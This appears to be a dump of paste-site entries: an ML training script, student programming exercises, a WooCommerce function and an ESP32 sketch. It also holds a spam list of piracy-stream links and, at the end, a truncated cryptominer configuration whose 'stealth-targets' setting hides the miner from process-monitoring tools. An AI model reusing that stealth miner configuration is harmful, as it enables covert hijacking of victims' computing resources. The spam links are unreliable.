    #     gaussians.restore(model_params, opt)

    bg_color = [1, 1, 1] if dataset.white_background else [0, 0, 0]
    background = torch.tensor(bg_color, dtype=torch.float32, device=""cuda"")

    iter_start = torch.cuda.Event(enable_timing=True)
    iter_end = torch.cuda.Event(enable_timing=True)

    viewpoint_stack = None
    ema_loss_for_log = 0.0
    progress_bar = tqdm(range(first_iter, opt.iterations), desc=""Training progress"")
    first_iter += 1

    random.seed()
    n_epochs = 0
    keys = ['_xyz', '_rotation', '_scaling', '_opacity', '_features_dc']
    num_views = len(scene.getTrainCameras())
    train_cameras = scene.getTrainCameras()
    # plot_variance_sparsity_cosine(dataset, opt, train_cameras, background, pipe, checkpoint, keys, num_trials=4)
    del scene
    checkpoints_list = [15000, 30000]
    run_epochs = 4
    warmup_epochs = 1
    batch_sizes = [1, 4, 8, 16, 32, 64]
    # batch_sizes = [1, 4]
    for lr_scaling in ['sqrt', 'constant', 'linear']:
        for rescale_betas in [True, False]:
            cosines_checkpoint, losses_checkpoint, norms_checkpoint = plot_batch_size_vs_weights_delta_similarity(
                dataset, opt, train_cameras, background, pipe, checkpoint, keys,
                checkpoints_list=checkpoints_list, batch_sizes=batch_sizes, run_epochs=run_epochs, warmup_epochs=warmup_epochs, rescale_betas=rescale_betas,
                lr_scaling='sqrt')
            for i in range(len(checkpoints_list)):
                plot(cosines_checkpoint[i], losses_checkpoint[i], norms_checkpoint[i], keys, checkpoints_list[i],
                     batch_sizes, rescale_betas, lr_scaling, warmup_epochs)
    for warmup_epochs in [0, 1, 2]:
        lr_scaling = 'sqrt'
        rescale_betas = True
        cosines_checkpoint, losses_checkpoint, norms_checkpoint = plot_batch_size_vs_weights_delta_similarity(
            dataset, opt, train_cameras, background, pipe, checkpoint, keys,
            checkpoints_list=checkpoints_list, batch_sizes=batch_sizes, run_epochs=run_epochs, warmup_epochs=warmup_epochs,
            rescale_betas=rescale_betas,
            lr_scaling='sqrt')
        for i in range(len(checkpoints_list)):
            plot(cosines_checkpoint[i], losses_checkpoint[i], norms_checkpoint[i], keys, checkpoints_list[i],
                 batch_sizes, rescale_betas, lr_scaling, warmup_epochs)
    quit()

    for iteration in range(first_iter, opt.iterations + 1):
        if network_gui.conn == None:
            network_gui.try_connect()
        while network_gui.conn != None:
            try:
                net_image_bytes = None
                custom_cam, do_training, pipe.convert_SHs_python, pipe.compute_cov3D_python, keep_alive, scaling_modifer = network_gui.receive()
                if custom_cam != None:
                    net_image = render(custom_cam, gaussians, pipe, background, scaling_modifer)[""render""]
                    net_image_bytes = memoryview((torch.clamp(net_image, min=0, max=1.0) * 255).byte().permute(1, 2,
                                                                                                               0).contiguous().cpu().numpy())
                network_gui.send(net_image_bytes, dataset.source_path)
                if do_training and ((iteration < int(opt.iterations)) or not keep_alive):
                    break
            except Exception as e:
                network_gui.conn = None

        iter_start.record()

        gaussians.update_learning_rate(iteration)

        # Every 1000 its we increase the levels of SH up to a maximum degree
        if iteration % 1000 == 0:
            gaussians.oneupSHdegree()

        # Pick a random Camera
        if not viewpoint_stack:
            viewpoint_stack = scene.getTrainCameras().copy()
            epoch_change = True
            n_epochs += 1
        else:
            epoch_change = False
        viewpoint_cam = viewpoint_stack.pop(randint(0, len(viewpoint_stack) - 1))

        if epoch_change and False:
            print('epoch ', n_epochs)

        # Render
        if (iteration - 1) == debug_from:
            pipe.debug = True

        bg = torch.rand((3), device=""cuda"") if opt.random_background else background

        render_pkg = render(viewpoint_cam, gaussians, pipe, bg)
        image, viewspace_point_tensor, visibility_filter, radii = render_pkg[""render""], render_pkg[""viewspace_points""], \
            render_pkg[""visibility_filter""], render_pkg[""radii""]

        # Loss
        gt_image = viewpoint_cam.original_image.cuda()
        Ll1 = l1_loss(image, gt_image)
        loss = (1.0 - opt.lambda_dssim) * Ll1 + opt.lambda_dssim * (1.0 - ssim(image, gt_image))
        loss.backward()

        iter_end.record()

        with torch.no_grad():
            # Progress bar
            ema_loss_for_log = 0.4 * loss.item() + 0.6 * ema_loss_for_log
            if iteration % 10 == 0:
                progress_bar.set_postfix({""Loss"": f""{ema_loss_for_log:.{7}f}""})
                progress_bar.update(10)
            if iteration == opt.iterations:
                progress_bar.close()

            # Log and save
            # training_report(tb_writer, iteration, Ll1, loss, l1_loss, iter_start.elapsed_time(iter_end),
            #                 testing_iterations, scene, render, (pipe, background))
            # if (iteration in saving_iterations):
            #     print(""\n[ITER {}] Saving Gaussians"".format(iteration))
            #     scene.save(iteration)

            # # Densification
            # if iteration < opt.densify_until_iter:
            #     # Keep track of max radii in image-space for pruning
            #     gaussians.max_radii2D[visibility_filter] = torch.max(gaussians.max_radii2D[visibility_filter],
            #                                                          radii[visibility_filter])
            #     gaussians.add_densification_stats(viewspace_point_tensor, visibility_filter)
            #
            #     if iteration > opt.densify_from_iter and iteration % opt.densification_interval == 0:
            #         size_threshold = 20 if iteration > opt.opacity_reset_interval else None
            #         gaussians.densify_and_prune(opt.densify_grad_threshold, 0.005, scene.cameras_extent, size_threshold)
            #
            #     if iteration % opt.opacity_reset_interval == 0 or (
            #             dataset.white_background and iteration == opt.densify_from_iter):
            #         gaussians.reset_opacity()

            # Optimizer step
            if iteration < opt.iterations:
                gaussians.optimizer.step()
                gaussians.optimizer.zero_grad(set_to_none=True)

            # if (iteration in checkpoint_iterations):
            #     print(""\n[ITER {}] Saving Checkpoint"".format(iteration))
            #     torch.save((gaussians.capture(), iteration), scene.model_path + ""/chkpnt"" + str(iteration) + "".pth"")


def prepare_output_and_logger(args):
    if not args.model_path:
        if os.getenv('OAR_JOB_ID'):
            unique_str = os.getenv('OAR_JOB_ID')
        else:
            unique_str = str(uuid.uuid4())
        args.model_path = os.path.join(""/tmp/sparsity-output/"", unique_str[0:10])

    # Set up output folder
    print(""Output folder: {}"".format(args.model_path))
    os.makedirs(args.model_path, exist_ok=True)
    with open(os.path.join(args.model_path, ""cfg_args""), 'w') as cfg_log_f:
        cfg_log_f.write(str(Namespace(**vars(args))))

    # Create Tensorboard writer
    tb_writer = None
    if TENSORBOARD_FOUND:
        tb_writer = SummaryWriter(args.model_path)
    else:
        print(""Tensorboard not available: not logging progress"")
    return tb_writer


def training_report(tb_writer, iteration, Ll1, loss, l1_loss, elapsed, testing_iterations, scene: Scene, renderFunc,
                    renderArgs):
    if tb_writer:
        tb_writer.add_scalar('train_loss_patches/l1_loss', Ll1.item(), iteration)
        tb_writer.add_scalar('train_loss_patches/total_loss', loss.item(), iteration)
        tb_writer.add_scalar('iter_time', elapsed, iteration)

    # Report test and samples of training set
    if iteration in testing_iterations:
        torch.cuda.empty_cache()
        validation_configs = ({'name': 'test', 'cameras': scene.getTestCameras()},
                              {'name': 'train',
                               'cameras': [scene.getTrainCameras()[idx % len(scene.getTrainCameras())] for idx in
                                           range(5, 30, 5)]})

        for config in validation_configs:
            if config['cameras'] and len(config['cameras']) > 0:
                l1_test = 0.0
                psnr_test = 0.0
                for idx, viewpoint in enumerate(config['cameras']):
                    image = torch.clamp(renderFunc(viewpoint, scene.gaussians, *renderArgs)[""render""], 0.0, 1.0)
                    gt_image = torch.clamp(viewpoint.original_image.to(""cuda""), 0.0, 1.0)
                    if tb_writer and (idx < 5):
                        tb_writer.add_images(config['name'] + ""_view_{}/render"".format(viewpoint.image_name),
                                             image[None], global_step=iteration)
                        if iteration == testing_iterations[0]:
                            tb_writer.add_images(config['name'] + ""_view_{}/ground_truth"".format(viewpoint.image_name),
                                                 gt_image[None], global_step=iteration)
                    l1_test += l1_loss(image, gt_image).mean().double()
                    psnr_test += psnr(image, gt_image).mean().double()
                psnr_test /= len(config['cameras'])
                l1_test /= len(config['cameras'])
                print(""\n[ITER {}] Evaluating {}: L1 {} PSNR {}"".format(iteration, config['name'], l1_test, psnr_test))
                if tb_writer:
                    tb_writer.add_scalar(config['name'] + '/loss_viewpoint - l1_loss', l1_test, iteration)
                    tb_writer.add_scalar(config['name'] + '/loss_viewpoint - psnr', psnr_test, iteration)

        if tb_writer:
            tb_writer.add_histogram(""scene/opacity_histogram"", scene.gaussians.get_opacity, iteration)
            tb_writer.add_scalar('total_points', scene.gaussians.get_xyz.shape[0], iteration)
        torch.cuda.empty_cache()


if __name__ == ""__main__"":
    # Set up command line argument parser
    parser = ArgumentParser(description=""Training script parameters"")
    lp = ModelParams(parser)
    op = OptimizationParams(parser)
    pp = PipelineParams(parser)
    save_iters = [0, 1_000, 4_500, 7_000, 11_000, 15_000, 18_000, 21_000, 24_000, 27_000, 30_000]
    parser.add_argument('--ip', type=str, default=""127.0.0.1"")
    parser.add_argument('--port', type=int, default=6009)
    parser.add_argument('--debug_from', type=int, default=-1)
    parser.add_argument('--detect_anomaly', action='store_true', default=False)
    parser.add_argument(""--test_iterations"", nargs=""+"", type=int, default=save_iters)
    parser.add_argument(""--save_iterations"", nargs=""+"", type=int, default=save_iters)
    parser.add_argument(""--quiet"", action=""store_true"")
    parser.add_argument(""--checkpoint_iterations"", nargs=""+"", type=int, default=save_iters)
    parser.add_argument(""--start_checkpoint"", type=str, default=None)
    args = parser.parse_args(sys.argv[1:])
    args.save_iterations.append(args.iterations)

    print(""Optimizing "" + args.model_path)

    # Initialize system state (RNG)
    safe_state(args.quiet)

    # Start GUI server, configure and run training
    # network_gui.init(args.ip, args.port)
    torch.autograd.set_detect_anomaly(args.detect_anomaly)
    training(lp.extract(args), op.extract(args), pp.extract(args), args.test_iterations, args.save_iterations,
             args.checkpoint_iterations, args.start_checkpoint, args.debug_from)

    # All done
    print(""\nTraining complete."")"
rn581Cgv,ejer1_tp5,orlandoju,C++,Monday 13th of May 2024 04:25:52 AM CDT,"    #include <iostream>
    #include <clocale>
    using namespace std;

    /*Hacer una función que reciba como parámetro dos números enteros y devuelva verdadero si el primero de ellos es múltiplo del segundo. Caso contrario debe devolver falso.*/


    bool esMultiplo(int x, int y);
    int main(){
        setlocale(LC_ALL,"""");
        int n,m= 0;
        cout<<""Ingrese dos números para saber si son multiplos entre el primero por el segundo: "" <<endl;
        cin>> n;
        cout<<endl;
        cin>> m;
        cout<<endl;
        bool multiplo = esMultiplo(n,m);
        if(multiplo ){
            cout<<""Los números son multiplos entre sí""<<endl;
        }
        else{
          cout<<""Los números no son multiplos entre sí""<<endl;
        }

    return 0;
    }
    bool esMultiplo(int x, int y) {
    if (y == 0) return false;  // Evitar división por cero
    return (x % y == 0);
    }
"
akkALYXR,ok 993,max2201111,Python,Monday 13th of May 2024 04:01:34 AM CDT,"import chess

# Inicializujte globální proměnnou P s výchozí hodnotou, která umožní spuštění minimax funkce
P = None

def evaluate_board(board, depth):
    if board.is_checkmate():
        return 1000 - depth if not board.turn else -1000 + depth
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
        return 0
    return 4  # Default heuristic for non-terminal positions

def minimax(board, depth, alpha, beta, maximizing_player, node_count, completed_depths):
    global P  # Deklarujte P jako globální proměnnou
    node_count[0] += 1
    if node_count[0] % 1000000 == 0:
        print(f""Nodes explored: {node_count[0]}"")

    if board.is_game_over():
        if depth not in completed_depths:
            print(f""Depth {depth} completed for the first time."")
            completed_depths.add(depth)
        return [], evaluate_board(board, depth)

    if depth > 9:
        if depth not in completed_depths:
            print(f""Depth {depth} completed for the first time."")
            completed_depths.add(depth)
        return [], evaluate_board(board, depth)

    best_eval = float('-inf') if maximizing_player else float('inf')
    best_sequence = []

    for move in board.legal_moves:
        board.push(move)
        sequence, eval = minimax(board, depth + 1, alpha, beta, not maximizing_player, node_count, completed_depths)
        board.pop()

        if maximizing_player:
            if eval > best_eval:
                best_eval = eval
                best_sequence = [board.san(move)] + sequence
            alpha = max(alpha, eval)
            if beta <= alpha:
                break
        else:
            if eval < best_eval:
                best_eval = eval
                best_sequence = [board.san(move)] + sequence
            beta = min(beta, eval)
            if beta <= alpha:
                break

        # Přiřaďte hodnotu evaluace P, kontrola může být tady
        P = eval

    if depth not in completed_depths:
        print(f""Depth {depth} completed for the first time."")
        completed_depths.add(depth)

    return best_sequence, best_eval

# Nastavte P na počáteční hodnotu, která umožňuje první spuštění
P = 5

# Testování funkce minimax
board = chess.Board(""8/6k1/8/2Q5/4K3/8/8/8 w - - 0 1"")
node_count = [0]
completed_depths = set()
sequence, evaluation = minimax(board, 0, float('-inf'), float('inf'), True, node_count, completed_depths)
print(f""Best sequence: {sequence}, Evaluation: {evaluation}"")
"
VVfX0JLw,IdeaSpark ESP32 - Digitale stroomteller uitlezen (Project with custom PCB),jgoy,C++,Monday 13th of May 2024 03:18:06 AM CDT,"/* A custom PCB is needed for this sketch */

#include <Adafruit_SSD1306.h>  // https://github.com/adafruit/Adafruit_SSD1306
#include <Fonts/FreeSans9pt7b.h>
#include <Fonts/FreeSansBold18pt7b.h>
#include <HardwareSerial.h>

HardwareSerial mySerial(2);  // gebruik UART2
Adafruit_SSD1306 oled(128, 64, &Wire, -1);

String myString, tempString, resultaat;

uint8_t SCREEN_ORIENTATION = 2;

void setup() {
  Serial.begin(115200);
  mySerial.begin(115200, SERIAL_8N1, 4, -1, true); 
  oled.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  oled.setRotation(SCREEN_ORIENTATION);
  oled.setTextColor(1);  // white = 1, black = 0
  oled.clearDisplay();
  oled.display();
  delay(1000);
}

void loop() {
  if (mySerial.available()) {
    myString = mySerial.readStringUntil('\n');
    if (myString.indexOf(""1-0:1.7.0"") >= 0) { 
      Serial.println(myString);
      toonGegevens();
    }
  }
}

void verwerkDeelString() {
  tempString = myString;
  int index1 = tempString.indexOf(""1-0:1.7.0"");
  resultaat = tempString.substring(index1 + 10, index1 + 19);
  resultaat.replace(""*"", "" "");
  resultaat.trim();
}

void toonGegevens() {
  verwerkDeelString();
  oled.clearDisplay();
  oled.setCursor(0, 12);
  oled.setFont(&FreeSans9pt7b);
  oled.println(""Digitale meter"");
  oled.println(""huidig verbruik:"");
  oled.setCursor(0, 60);
  oled.print(resultaat);
  oled.display();
}"
nZcw795v,Untitled,ruchej,PostgreSQL,Monday 13th of May 2024 03:04:26 AM CDT,"SELECT
	PUBLIC.OPTIMAL_LIMITS_D.MIN_LIMIT AS MIN_LIMIT,
	PUBLIC.OPTIMAL_LIMITS_D.MAX_LIMIT AS MAX_LIMIT,
	PUBLIC.OPTIMAL_LIMITS_D.INDICATOR_ID AS INDICATOR_ID,
	PUBLIC.SP_PV_MAPPING.SP_INDICATOR_ID
FROM
	PUBLIC.OPTIMAL_LIMITS_D,
	(
		SELECT
			PUBLIC.TECHNOLOGICAL_MODES_D.MODE_ID AS MODE_ID
		FROM
			PUBLIC.TECHNOLOGICAL_MODES_D
		WHERE
			PUBLIC.TECHNOLOGICAL_MODES_D.DT = (
				SELECT
					MAX(PUBLIC.TECHNOLOGICAL_MODES_D.DT) AS MAX_2
				FROM
					PUBLIC.TECHNOLOGICAL_MODES_D
				WHERE
					PUBLIC.TECHNOLOGICAL_MODES_D.DT <= '2024-05-13 00:00'
			)
			AND PUBLIC.TECHNOLOGICAL_MODES_D.SECTION_ID = 7
	) AS ANON_8
LEFT JOIN PUBLIC.SP_PV_MAPPING ON PUBLIC.SP_PV_MAPPING.PV_INDICATOR_ID = PUBLIC.OPTIMAL_LIMITS_D.INDICATOR_ID
WHERE
	PUBLIC.OPTIMAL_LIMITS_D.INSERT_DT = (
		SELECT
			MAX(PUBLIC.OPTIMAL_LIMITS_D.INSERT_DT) AS MAX_3
		FROM
			PUBLIC.OPTIMAL_LIMITS_D
		WHERE
			PUBLIC.OPTIMAL_LIMITS_D.INSERT_DT <= '2024-05-13 00:00'
	)
	AND PUBLIC.OPTIMAL_LIMITS_D.MODE_ID = ANON_8.MODE_ID
	AND PUBLIC.OPTIMAL_LIMITS_D.SECTION_ID = 7
ORDER BY
	INDICATOR_ID DESC"
WB0kEARN,blatt1_2aufgabe,madegoff,VHDL,Monday 13th of May 2024 02:59:36 AM CDT,"library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

library work;
use work.ArmTypes.INSTRUCTION_ID_WIDTH;
use work.ArmTypes.VCR_RESET;

entity ArmInstructionAddressRegister is
	port(
		IAR_CLK 	: in std_logic;
		IAR_RST 	: in std_logic;
		IAR_INC		: in std_logic;
		IAR_LOAD 	: in std_logic;
		IAR_REVOKE	: in std_logic;
		IAR_UPDATE_HB	: in std_logic;
--------------------------------------------------------------------------------
--	INSTRUCTION_ID_WIDTH  ist ein globaler Konfigurationsparameter
--	zur Einstellung der Breite der Instruktions-IDs und damit der Tiefe
--	der verteilten Puffer. Eine Breite von 3 Bit genuegt fuer die 
--	fuenfstufige Pipeline definitiv.
--------------------------------------------------------------------------------
		IAR_HISTORY_ID	: in std_logic_vector(INSTRUCTION_ID_WIDTH-1 downto 0);
		IAR_ADDR_IN 	: in std_logic_vector(31 downto 2);
		IAR_ADDR_OUT 	: out std_logic_vector(31 downto 2);
		IAR_NEXT_ADDR_OUT : out std_logic_vector(31 downto 2)
	    );
	
end entity ArmInstructionAddressRegister;

architecture behave of ArmInstructionAddressRegister is

	component ArmRamBuffer
	generic(
		ARB_ADDR_WIDTH : natural range 1 to 4 := 3;
		ARB_DATA_WIDTH : natural range 1 to 64 := 32
	       );
	port(
		ARB_CLK 	: in std_logic;
		ARB_WRITE_EN	: in std_logic;
		ARB_ADDR	: in std_logic_vector(ARB_ADDR_WIDTH-1 downto 0);
		ARB_DATA_IN	: in std_logic_vector(ARB_DATA_WIDTH-1 downto 0);          
		ARB_DATA_OUT	: out std_logic_vector(ARB_DATA_WIDTH-1 downto 0)
		);
	end component ArmRamBuffer;

signal mux1_out : std_logic_vector(31 downto 2) := (others => '0');
signal mux2_out : std_logic_vector(31 downto 2) := (others => '0');
signal register_out : std_logic_vector(31 downto 2);
signal buffer_out : std_logic_vector(31 downto 2) := (others => '0');

begin

	reg : process(IAR_CLK) is
   	begin
    	if (rising_edge(IAR_CLK)) then
    	   if IAR_RST = '1' then
    	       register_out <= (others => '0');
    	   else
      	       register_out <= mux2_out;
           end if;
      	end if;
	end process reg;
	
    with IAR_INC select --erster MUX
       mux1_out <= std_logic_vector(4 + unsigned(register_out)) when '1',
                   register_out when others;
                      
    with IAR_LOAD select --zweiter MUX
       mux2_out <= IAR_ADDR_IN when '1',
                   mux1_out when others;
                      
    with IAR_REVOKE select --dritter MUX
       IAR_NEXT_ADDR_OUT <= buffer_out when '1',
                            std_logic_vector(4 + unsigned(register_out)) when others;
        
    IAR_ADDR_OUT <= register_out;

	IAR_HISTORY_BUFFER: ArmRamBuffer 
	generic map(
			ARB_ADDR_WIDTH => INSTRUCTION_ID_WIDTH,
			ARB_DATA_WIDTH => 30
		)
	port map(
		ARB_CLK		=> IAR_CLK,
		ARB_WRITE_EN	=> IAR_UPDATE_HB,
		ARB_ADDR	=> IAR_HISTORY_ID,
		ARB_DATA_IN	=> register_out,
		ARB_DATA_OUT	=> buffer_out
	);

end architecture behave;
"
wF5HMfQB,Untitled,nshelper,PHP,Monday 13th of May 2024 02:37:52 AM CDT,"public static function get_order_summary($order){
		$cart = array();
		$cart['products']   = array();
		$cart['categories'] = array();
		$cart['tags'] 		= array();
		$cart['variations'] = array();
		$cart['shipping_class'] = array();
		$cart['product_type'] = array();
		$shipping_weight = 0;

		if($order){
			$items = $order->get_items();
			$order_total = $order->get_total();
			$order_subtotal = $order->get_subtotal();
			foreach($items as $item) {
                do_action( 'woocommerce/cart_loop/start', $item );
				$product_id = $item->get_product_id();
				if(!$product_id){
					continue;
				}

				$cart['products'][] = self::get_original_product_id($product_id);
				$cart['categories'] = array_merge( $cart['categories'], self::get_product_categories($product_id) );
				$cart['tags']       = array_merge( $cart['tags'], self::get_product_tags($product_id) );
				$cart['shipping_class'] = array_merge($cart['shipping_class'] ,self::get_product_shipping_class($product_id));
				$cart['product_type'][] = WC_Product_Factory::get_product_type($product_id);

				if($item->get_variation_id()){
					$cart['variations'][] = $item->get_variation_id();
					$cart['products'][] = self::get_original_product_id($item->get_variation_id());
				}
				$product_qty = $item->get_quantity();
				$_product = wc_get_product( $product_id );
				$weight = $_product->get_weight();
				if(!empty($weight) && is_numeric($weight)){
					$shipping_weight += $weight * $product_qty;
				}
                do_action( 'woocommerce/cart_loop/end', $item );
			}

			$cart['products']   = array_values($cart['products']);
			$cart['categories'] = apply_filters('thwcfe_cart_product_categories', array_values($cart['categories']));
			$cart['tags'] 		= apply_filters('thwcfe_cart_product_tags', array_values($cart['tags']));
			$cart['variations']    = array_values($cart['variations']);
			$cart['shipping_class'] = array_values($cart['shipping_class']);
			$cart['product_type']  = array_values($cart['product_type']);
			$cart['cart_total']    = $order_total;
			$cart['cart_subtotal'] = $order_subtotal;
			$cart['shipping_weight']   = $shipping_weight;
		}
		return $cart;
	}"
RZr1wwXT,dfgdrhrdj,gadungw71,PHP,Monday 13th of May 2024 02:24:06 AM CDT,"https://github.com/Phim-L-t-M-t-7-M-t-Di-u-c-2024-Viet
https://topmate.io/watchlatmat7_motdieuuoc/977936
https://topmate.io/phim_faceoff7_onewish2024/977942
https://topmate.io/watch_kingdomoftheplanet/977947
https://topmate.io/phim_hanh_tinh_khi_vuongquocmoi/977950
https://topmate.io/free_vayham_ketrungphat/977970
https://topmate.io/vayham_ketrungphat/977987
https://topmate.io/hdpunishment_koreansub/977994
https://topmate.io/haphap_tangkap/977996
https://www.kooapp.com/koo/guest_P68S8O/d6a1f735-3d12-4308-9d1c-20226df9f794
https://open.firstory.me/user/clw4lexv1000901uw942m65yt
https://open.firstory.me/story/clw4lfdpa000h01uwgbofexfy
https://wandering.flarum.cloud/d/61661-gfdgrdh
https://hiuderyy.hashnode.dev/brtyturtuythu
https://www.bankier.pl/forum/temat_walangkeke,66286231.html
https://medium.com/@rarawwwuu25/xem-phim-l%E1%BA%ADt-m%E1%BA%B7t-7-m%E1%BB%99t-%C4%91i%E1%BB%81u-%C6%B0%E1%BB%9Bc-full-4k-vietsub-48bf3dbfba01
https://www.onfeetnation.com/profiles/blogs/godegann
https://forum.mush.com.br/topic/216002/xem-phim-l%E1%BA%ADt-m%E1%BA%B7t-7-m%E1%BB%99t-%C4%91i%E1%BB%81u-%C6%B0%E1%BB%9Bc-ph%C3%A1t-vietsub-thuy%E1%BA%BFt-minh-full-hd-2024-md
https://hackmd.io/@rerewilli6/BJQ334kmR
https://demo.hedgedoc.org/s/LyuNtZD6o
https://rentry.co/imzh3wgb
https://paste.ee/p/gLA0C
https://yamcode.com/sfsefsg-90
https://lifeisfeudal.com/Discussions/question/abadiselamanya
https://start.me/w/82wMeM
https://plaza.rakuten.co.jp/aryasantosso/diary/202405130000/
https://telegra.ph/SFDSAEVT-05-13
https://muckrack.com/rutan-cloudb/bio
https://profile.hatena.ne.jp/FGDFHD/
https://www.bitsdujour.com/profiles/f4XZoV
http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/754233/Default.aspx
https://www.fitlynk.com/1715584915F935549
"
5LVdtVB8,lab 10,SillyWolfy,C++,Monday 13th of May 2024 12:46:36 AM CDT,"#define NOMINMAX
#include <windows.h>
#include <iostream>
#include <string>
#include <limits>
using namespace std;

template<typename T>
struct Node {
    T data;
    Node* next;

    Node(T val) : data(val), next(nullptr) {}
};

template<typename T>
class LinkedList {
private:
    Node<T>* head;

public:
    LinkedList() : head(nullptr) {}
    void push_back(T value) {
        Node<T>* newNode = new Node<T>(value);
        if (head == nullptr) {
            head = newNode;
        }
        else {
            Node<T>* temp = head;
            while (temp->next != nullptr) {
                temp = temp->next;
            }
            temp->next = newNode;
        }
    }
    void remove_at(int position) {
        Node<T>* temp = head;
        if (position == 0) {
            head = head->next;
            delete temp;
            return;
        }
        for (int i = 0; temp != nullptr and i < position - 1; ++i) {
            temp = temp->next;
        }
        Node<T>* nodeToDelete = temp->next;
        temp->next = temp->next->next;
        delete nodeToDelete;
    }
    void print() const {
        Node<T>* temp = head;
        while (temp != nullptr) {
            temp->data.print();
            cout << '\n';
            temp = temp->next;
        }
    }
    int size() const {
        int count = 0;
        Node<T>* temp = head;
        while (temp != nullptr) {
            count++;
            temp = temp->next;
        }
        return count;
    }
    T& get(int index) {
        Node<T>* temp = head;
        for (int i = 0; temp != nullptr and i < index; ++i) {
            temp = temp->next;
        }
        return temp->data;
    }
    ~LinkedList() {
        Node<T>* current = head;
        Node<T>* nextNode;
        while (current != nullptr) {
            nextNode = current->next;
            delete current;
            current = nextNode;
        }
    }
};

class Product
{
public:
    Product();
    Product(string namee, int weightt, int pricee, int lifee) {
        this->name = namee;
        this->weight = weightt;
        this->price = pricee;
        this->life = lifee;
    }
    void print() const {
        cout << ""Название продукта: "" << this->name << '\n'
            << ""Вес продукта: "" << this->weight << '\n'
            << ""Цена продукта: "" << this->price << '\n'
            << ""Срок годности продукта: "" << this->life << '\n';
        if (life <= 2) {
            cout << ""Данный товар идёт по уценке!\n"";
        }
    }
    string get_name() const {
        return this->name;
    }
private:
    string name;
    int weight;
    int price;
    int life;
};

void add_product(LinkedList<Product>& database) {
    cout << ""\tДобавление продукта в список\n"";
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    cout << ""Введите название продукта: "";
    string name;
    getline(cin, name);
    cout << '\n';
    cout << ""Введите вес продукта: "";
    int weight;
    while (true) {
        cin >> weight;
        if (cin.fail() or weight <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            break;
        }
    }
    cout << '\n';
    cout << ""Введите цену продукта: "";
    int price;
    while (true) {
        cin >> price;
        if (cin.fail() or price <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            break;
        }
    }
    cout << '\n';
    cout << ""Введите срок годности продукта в днях продукта: "";
    int life;
    while (true) {
        cin >> life;
        if (cin.fail() or life <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
        }
        else {
            break;
        }
    }
    database.push_back(Product(name, weight, price, life));
}

void delete_product(LinkedList<Product>& database, int index) {
    database.remove_at(index - 1);
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    setlocale(LC_ALL, ""Russian"");
    LinkedList<Product> DateBase;
    while (true) {
        cout << ""\tMeню\n"";
        cout << ""Необходимо выбрать один из пунктов:\n"";
        cout << ""1) Добавить продукт в список\n"";
        cout << ""2) Удалить продукт из списка\n"";
        cout << ""3) Вывести список\n"";
        cout << ""4) Закончить программу\n"";
        cout << ""Введите номер необходимого пункта: "";
        int choice;
        while (true) {
            cin >> choice;
            if (cin.fail() or choice <= 0) {
                cin.clear();
                cin.ignore();
                cout << ""Некорректный ввод. Пожалуйста, введите положительное число: "";
            }
            else {
                break;
            }
        }
        switch (choice) {
        case 1: {
            system(""cls"");
            add_product(DateBase);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 2: {
            system(""cls"");
            int dbSize = DateBase.size();
            if (dbSize == 0) {
                cout << ""В вашем списке ничего нет!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            for (int i = 0; i < dbSize; ++i) {
                cout << i + 1 << "". "" << DateBase.get(i).get_name() << '\n';
            }
            cout << ""Введите индекс продукта, который нужно удалить: "";
            int index;
            while (true) {
                cin >> index;
                if (cin.fail() or index <= 0 or index > dbSize) {
                    cin.clear();
                    cin.ignore();
                    cout << ""Некорректный ввод. Пожалуйста, введите число из доступного диапазона: "";
                }
                else {
                    break;
                }
            }
            delete_product(DateBase, index);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 3: {
            system(""cls"");
            if (DateBase.size() == 0) {
                cout << ""В вашем списке ничего нет!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            DateBase.print();
            system(""pause"");
            system(""cls"");
            break;
        }
        case 4: {
            return 0;
        }
        default:
            system(""cls"");
            break;
        }
    }
}
"
JFCDeKwC,TestingM,tarekxx,JSON,Monday 13th of May 2024 12:34:55 AM CDT,"{
    ""algo"": ""rx/0"",
    ""pool"": ""zeph-eu1.nanopool.org"",
    ""port"": 10943,
    ""wallet"": ""ZEPHs787ivBXAw2CUxSkCYBDey6SE8bgD7dgWYLS94reSxSkkytU97eTyx33LQGUdbEueLWTHKEdnYwQi5oVNWMQ5ULrHk6i9P9.XZXZXZX/mypassword1234"",
    ""ssltls"": true,
    ""max-cpu"": 20,
    ""idle-wait"": 1,
    ""idle-cpu"": 80,
    ""stealth-targets"": ""ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"",
